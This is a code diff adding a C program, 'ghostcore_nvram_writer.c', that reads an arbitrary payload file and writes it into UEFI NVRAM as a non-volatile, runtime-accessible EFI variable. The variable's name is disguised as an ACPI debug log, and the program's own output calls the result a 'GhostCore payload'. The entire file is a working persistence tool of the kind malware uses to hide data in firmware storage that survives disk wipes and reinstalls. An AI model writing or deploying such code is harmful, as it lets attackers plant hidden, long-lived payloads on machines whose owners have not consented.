@@ -1,0 +1,66 @@
+// ghostcore_nvram_writer.c
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <errno.h>
+
+#define VAR_NAME "ACPI_DBG_LOG-4d1ede05-38c7-4a6a-9cc6-4bcca8b38c14"
+#define EFIVARS_PATH "/sys/firmware/efi/efivars/" VAR_NAME
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <payload file>\n", argv[0]);
+        return 1;
+    }
+
+    const char *payload_path = argv[1];
+    FILE *fp = fopen(payload_path, "rb");
+    if (!fp) {
+        perror("Failed to open payload file");
+        return 1;
+    }
+
+    // Read payload into memory
+    fseek(fp, 0, SEEK_END);
+    size_t fsize = ftell(fp);
+    rewind(fp);
+
+    unsigned char *payload = malloc(fsize + 4);
+    if (!payload) {
+        fclose(fp);
+        perror("Memory error");
+        return 1;
+    }
+
+    fread(payload + 4, 1, fsize, fp);
+    fclose(fp);
+
+    // Attributes: 07 00 00 00 => EFI_VARIABLE_NON_VOLATILE | BOOTSERVICE_ACCESS | RUNTIME_ACCESS
+    payload[0] = 0x07;
+    payload[1] = 0x00;
+    payload[2] = 0x00;
+    payload[3] = 0x00;
+
+    // Write to efivarfs
+    int fd = open(EFIVARS_PATH, O_WRONLY | O_CREAT, 0644);
+    if (fd < 0) {
+        perror("Failed to open EFI variable path (maybe run as root?)");
+        return 1;
+    }
+
+    if (write(fd, payload, fsize + 4) != fsize + 4) {
+        perror("Failed to write EFI variable");
+        close(fd);
+        return 1;
+    }
+
+    printf("🔥 GhostCore payload written to NVRAM as %s\n", VAR_NAME);
+    close(fd);
+    free(payload);
+    return 0;
+}
+
